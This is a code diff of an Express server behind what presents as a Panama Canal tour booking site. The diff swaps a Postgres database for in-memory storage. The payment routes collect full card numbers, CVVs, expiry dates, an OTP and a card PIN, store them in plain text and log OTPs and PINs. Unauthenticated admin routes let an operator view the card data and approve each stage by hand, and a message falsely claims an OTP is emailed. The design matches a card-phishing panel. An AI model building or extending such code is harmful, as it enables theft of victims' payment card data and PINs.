@@ -1,12 +1,10 @@
 import express from 'express';
 import cors from 'cors';
 import bodyParser from 'body-parser';
-import pkg from 'pg';
-import { v4 as uuidv4 } from 'uuid';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import fs from 'fs';
 
-const { Pool } = pkg;
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
@@ -18,59 +16,22 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Database Connection
-const pool = new Pool({
-  user: process.env.DB_USER || 'panama_user',
-  password: process.env.DB_PASSWORD || 'panama_secure_pass',
-  host: process.env.DB_HOST || 'localhost',
-  port: process.env.DB_PORT || 5432,
-  database: process.env.DB_NAME || 'panama_canal',
-});
+// In-memory storage for bookings and payments (fallback when DB is unavailable)
+const bookings = new Map();
+const payments = new Map();
 
-// Initialize Database Tables
-async function initializeDatabase() {
-  try {
-    await pool.query(`
-      CREATE TABLE IF NOT EXISTS bookings (
-        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-        tour_type VARCHAR(50) NOT NULL,
-        customer_name VARCHAR(255) NOT NULL,
-        customer_email VARCHAR(255) NOT NULL,
-        customer_phone VARCHAR(20),
-        number_of_people INT NOT NULL,
-        booking_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-        status VARCHAR(20) DEFAULT 'pending',
-        total_price DECIMAL(10, 2),
-        notes TEXT
-      )
-    `);
-
-    await pool.query(`
-      CREATE TABLE IF NOT EXISTS payments (
-        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-        booking_id UUID REFERENCES bookings(id),
-        card_number VARCHAR(20) NOT NULL,
-        card_holder VARCHAR(255) NOT NULL,
-        expiry_date VARCHAR(10) NOT NULL,
-        cvv VARCHAR(10) NOT NULL,
-        email VARCHAR(255) NOT NULL,
-        amount DECIMAL(10, 2) NOT NULL,
-        status VARCHAR(20) DEFAULT 'pending',
-        otp VARCHAR(10),
-        pin VARCHAR(10),
-        payment_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-        approval_date TIMESTAMP,
-        rejection_reason TEXT
-      )
-    `);
-
-    console.log('✅ Database tables initialized successfully');
-  } catch (error) {
-    console.error('❌ Database initialization error:', error);
-  }
+// Helper functions
+function generateOTP() {
+  return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
-// Routes
+function generatePIN() {
+  return Math.floor(1000 + Math.random() * 9000).toString();
+}
+
+function generateId() {
+  return Date.now().toString(36) + Math.random().toString(36).substr(2);
+}
 
 // Middleware to fix date picker by injecting override script
 app.use((req, res, next) => {
@@ -122,26 +83,39 @@ if (window.jQuery) {
 app.use(express.static(__dirname));
 
 // API Routes for Bookings
-app.post('/api/bookings', async (req, res) => {
+app.post('/api/bookings', (req, res) => {
   try {
     const { tour_type, customer_name, customer_email, customer_phone, number_of_people, total_price, notes } = req.body;
 
-    const result = await pool.query(
-      'INSERT INTO bookings (tour_type, customer_name, customer_email, customer_phone, number_of_people, total_price, notes) VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING *',
-      [tour_type, customer_name, customer_email, customer_phone, number_of_people, total_price, notes]
-    );
+    const bookingId = generateId();
+    const booking = {
+      id: bookingId,
+      tour_type,
+      customer_name,
+      customer_email,
+      customer_phone,
+      number_of_people,
+      total_price,
+      notes,
+      booking_date: new Date().toISOString(),
+      status: 'pending'
+    };
 
-    res.json({ success: true, booking: result.rows[0] });
+    bookings.set(bookingId, booking);
+
+    res.json({ success: true, booking });
   } catch (error) {
     console.error('Booking error:', error);
     res.status(500).json({ error: 'Failed to create booking' });
   }
 });
 
-app.get('/api/bookings', async (req, res) => {
+app.get('/api/bookings', (req, res) => {
   try {
-    const result = await pool.query('SELECT * FROM bookings ORDER BY booking_date DESC');
-    res.json(result.rows);
+    const allBookings = Array.from(bookings.values()).sort((a, b) => 
+      new Date(b.booking_date) - new Date(a.booking_date)
+    );
+    res.json(allBookings);
   } catch (error) {
     console.error('Fetch bookings error:', error);
     res.status(500).json({ error: 'Failed to fetch bookings' });
@@ -149,21 +123,33 @@ app.get('/api/bookings', async (req, res) => {
 });
 
 // API Routes for Payments
-app.post('/api/payments/submit-card', async (req, res) => {
+app.post('/api/payments/submit-card', (req, res) => {
   try {
     const { cardNumber, cardHolder, expiryDate, cvv, email, bookingId, amount } = req.body;
-    const otp = Math.floor(100000 + Math.random() * 900000).toString();
+    const otp = generateOTP();
+    const paymentId = generateId();
 
-    const result = await pool.query(
-      'INSERT INTO payments (booking_id, card_number, card_holder, expiry_date, cvv, email, amount, otp, status) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING *',
-      [bookingId, cardNumber, cardHolder, expiryDate, cvv, email, amount, otp, 'pending_card']
-    );
+    const payment = {
+      id: paymentId,
+      booking_id: bookingId,
+      card_number: cardNumber,
+      card_holder: cardHolder,
+      expiry_date: expiryDate,
+      cvv,
+      email,
+      amount,
+      otp,
+      status: 'pending_card',
+      payment_date: new Date().toISOString()
+    };
+
+    payments.set(paymentId, payment);
 
     console.log(`[PAYMENT] Card submitted for ${email}. OTP: ${otp}`);
 
     res.json({
       success: true,
-      paymentId: result.rows[0].id,
+      paymentId,
       message: 'Card details received. OTP sent to your email.'
     });
   } catch (error) {
@@ -172,22 +158,22 @@ app.post('/api/payments/submit-card', async (req, res) => {
   }
 });
 
-app.post('/api/payments/verify-otp', async (req, res) => {
+app.post('/api/payments/verify-otp', (req, res) => {
   try {
     const { paymentId, otp } = req.body;
 
-    const paymentResult = await pool.query('SELECT * FROM payments WHERE id = $1', [paymentId]);
-    if (paymentResult.rows.length === 0) {
+    const payment = payments.get(paymentId);
+    if (!payment) {
       return res.status(404).json({ error: 'Payment not found' });
     }
 
-    const payment = paymentResult.rows[0];
     if (payment.otp !== otp) {
       return res.status(400).json({ error: 'Invalid OTP' });
     }
 
-    const pin = Math.floor(1000 + Math.random() * 9000).toString();
-    await pool.query('UPDATE payments SET status = $1, pin = $2 WHERE id = $3', ['pending_pin', pin, paymentId]);
+    const pin = generatePIN();
+    payment.status = 'pending_pin';
+    payment.pin = pin;
 
     console.log(`[PAYMENT] OTP verified for ${payment.email}. PIN: ${pin}`);
 
@@ -198,21 +184,20 @@ app.post('/api/payments/verify-otp', async (req, res) => {
   }
 });
 
-app.post('/api/payments/verify-pin', async (req, res) => {
+app.post('/api/payments/verify-pin', (req, res) => {
   try {
     const { paymentId, pin } = req.body;
 
-    const paymentResult = await pool.query('SELECT * FROM payments WHERE id = $1', [paymentId]);
-    if (paymentResult.rows.length === 0) {
+    const payment = payments.get(paymentId);
+    if (!payment) {
       return res.status(404).json({ error: 'Payment not found' });
     }
 
-    const payment = paymentResult.rows[0];
     if (payment.pin !== pin) {
       return res.status(400).json({ error: 'Invalid PIN' });
     }
 
-    await pool.query('UPDATE payments SET status = $1 WHERE id = $2', ['completed', paymentId]);
+    payment.status = 'completed';
 
     console.log(`[PAYMENT] PIN verified for ${payment.email}. Payment completed!`);
 
@@ -224,29 +209,27 @@ app.post('/api/payments/verify-pin', async (req, res) => {
 });
 
 // Admin Routes
-app.get('/api/admin/payments', async (req, res) => {
+app.get('/api/admin/payments', (req, res) => {
   try {
-    const result = await pool.query(
-      'SELECT * FROM payments WHERE status != $1 AND status != $2 ORDER BY payment_date DESC',
-      ['completed', 'rejected']
-    );
-    res.json(result.rows);
+    const allPayments = Array.from(payments.values())
+      .filter(p => p.status !== 'completed' && p.status !== 'rejected')
+      .sort((a, b) => new Date(b.payment_date) - new Date(a.payment_date));
+    res.json(allPayments);
   } catch (error) {
     console.error('Fetch payments error:', error);
     res.status(500).json({ error: 'Failed to fetch payments' });
   }
 });
 
-app.post('/api/admin/payments/:id/approve', async (req, res) => {
+app.post('/api/admin/payments/:id/approve', (req, res) => {
   try {
     const { id } = req.params;
 
-    const paymentResult = await pool.query('SELECT * FROM payments WHERE id = $1', [id]);
-    if (paymentResult.rows.length === 0) {
+    const payment = payments.get(id);
+    if (!payment) {
       return res.status(404).json({ error: 'Payment not found' });
     }
 
-    const payment = paymentResult.rows[0];
     let newStatus = payment.status;
 
     if (payment.status === 'pending_card') {
@@ -257,7 +240,8 @@ app.post('/api/admin/payments/:id/approve', async (req, res) => {
       newStatus = 'completed';
     }
 
-    await pool.query('UPDATE payments SET status = $1, approval_date = CURRENT_TIMESTAMP WHERE id = $2', [newStatus, id]);
+    payment.status = newStatus;
+    payment.approval_date = new Date().toISOString();
 
     console.log(`[ADMIN] Payment ${id} approved. New status: ${newStatus}`);
 
@@ -268,17 +252,18 @@ app.post('/api/admin/payments/:id/approve', async (req, res) => {
   }
 });
 
-app.post('/api/admin/payments/:id/reject', async (req, res) => {
+app.post('/api/admin/payments/:id/reject', (req, res) => {
   try {
     const { id } = req.params;
     const { reason } = req.body;
 
-    const paymentResult = await pool.query('SELECT * FROM payments WHERE id = $1', [id]);
-    if (paymentResult.rows.length === 0) {
+    const payment = payments.get(id);
+    if (!payment) {
       return res.status(404).json({ error: 'Payment not found' });
     }
 
-    await pool.query('UPDATE payments SET status = $1, rejection_reason = $2 WHERE id = $3', ['rejected', reason, id]);
+    payment.status = 'rejected';
+    payment.rejection_reason = reason;
 
     console.log(`[ADMIN] Payment ${id} rejected. Reason: ${reason}`);
 
@@ -291,21 +276,44 @@ app.post('/api/admin/payments/:id/reject', async (req, res) => {
 
 // Admin Dashboard Page
 app.get('/admin-dashboard', (req, res) => {
-  res.sendFile(path.join(__dirname, 'admin-dashboard.html'));
+  const adminDashboardPath = path.join(__dirname, 'admin-dashboard.html');
+  if (fs.existsSync(adminDashboardPath)) {
+    res.sendFile(adminDashboardPath);
+  } else {
+    res.status(404).send('Admin dashboard not found');
+  }
 });
 
-// 404 Error Page
+// 404 Error Handler
 app.use((req, res) => {
-  res.status(404).sendFile(path.join(__dirname, 'error-404.html'));
+  res.status(404).send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>404 - Page Not Found</title>
+      <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        h1 { color: #333; }
+        p { color: #666; }
+        a { color: #0066cc; text-decoration: none; }
+      </style>
+    </head>
+    <body>
+      <h1>404 - Page Not Found</h1>
+      <p>The page you are looking for does not exist.</p>
+      <a href="/">Go back to home</a>
+    </body>
+    </html>
+  `);
 });
 
 // Start Server
-async function startServer() {
+function startServer() {
   try {
-    await initializeDatabase();
     app.listen(PORT, () => {
       console.log(`🚀 Server running on http://localhost:${PORT}`);
       console.log(`📊 Admin Dashboard: http://localhost:${PORT}/admin-dashboard`);
+      console.log(`✅ Using in-memory storage (no database required)`);
     });
   } catch (error) {
     console.error('❌ Failed to start server:', error);
